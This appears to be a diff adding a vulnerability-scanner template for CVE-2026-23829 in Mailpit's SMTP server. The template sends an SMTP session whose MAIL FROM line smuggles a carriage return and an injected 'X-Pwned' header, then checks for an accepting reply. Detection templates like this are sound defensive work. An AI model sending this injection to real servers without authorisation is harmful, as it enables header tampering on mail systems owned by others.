@@ -1,0 +1,45 @@
+id: vt-2026-23829-inject
+
+info:
+  name: Mailpit SMTP - Header Injection via Regex Bypass (Injector)
+  author: omarkurt
+  severity: medium
+  description: |
+    This template injects a custom header into an SMTP transaction to test for header injection vulnerabilities in Mailpit. By sending a specially crafted MAIL FROM command with a carriage return and additional header, we can determine if the server is vulnerable to header injection. This is a non-destructive test that does not rely on any specific response content, making it suitable for safely identifying the vulnerability.
+  reference:
+    - https://github.com/axllent/mailpit/security/advisories/GHSA-54wq-72mp-cq7c
+    - https://github.com/axllent/mailpit/commit/36cc06c125954dec6673219dafa084e13cc14534
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-23829
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
+    cvss-score: 5.3
+    cve-id: CVE-2026-23829
+    cwe-id: CWE-150
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: axllent
+    product: mailpit
+  tags: cve,cve-2026,mailpit,smtp,header-injection,network
+
+network:
+  - host:
+      - "{{Hostname}}:1025"
+
+    read-all: true
+    read-size: 4096
+
+    inputs:
+      - data: "EHLO {{Hostname}}\r\n"
+      - data: "MAIL FROM:<attacker\rX-Pwned:{{randstr}}>\r\n"
+      - data: "RCPT TO:<victim@example.com>\r\n"
+      - data: "DATA\r\n"
+      - data: "Subject: CVE-2026-23829 Proof\r\n\r\nHeader Injection Test.\r\n.\r\n"
+      - data: "QUIT\r\n"
+
+    matchers:
+      - type: word
+        words:
+          - "250 Ok"
+          - "250 2.1.0 Ok"
+        condition: or
